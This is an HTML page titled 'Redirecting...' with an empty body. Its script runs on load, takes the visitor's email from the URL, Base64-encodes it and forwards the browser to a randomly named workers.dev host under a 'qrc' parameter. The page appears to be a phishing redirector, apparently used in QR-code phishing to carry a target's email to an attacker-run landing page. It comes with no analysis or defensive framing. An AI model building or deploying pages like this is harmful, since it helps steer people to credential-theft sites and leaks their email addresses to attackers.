<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script>
        // Function to parse email query parameter from URL
        function getEmailFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('email');
        }

        // Function to encode a string to Base64
        function encodeToBase64(str) {
            return btoa(str);
        }

        // Function to decode a Base64 string
        function decodeFromBase64(encodedStr) {
            return atob(encodedStr);
        }

        // Function to check if a string is Base64 encoded
        function isBase64(str) {
            try {
                return btoa(atob(str)) === str;
            } catch (err) {
                return false;
            }
        }

        // Function to redirect to the specified URL with encoded email query parameter
        function redirectToCustomURL() {
            const email = getEmailFromUrl();
            if (email) {
                let encodedEmail;
                if (isBase64(email)) {
                    encodedEmail = email;
                } else {
                    encodedEmail = encodeToBase64(email);
                }
                const redirectUrl = `https://ee92f82c.d874c7c1f8062afc4f2fd153.workers.dev/?qrc=${encodeURIComponent(encodedEmail)}`;
                window.location.replace(redirectUrl);
            } else {
                console.error('Email parameter not found in URL');
            }
        }

        // Redirect on page load
        window.onload = redirectToCustomURL;
    </script>
</head>
<body>
    <p></p>
</body>
</html>

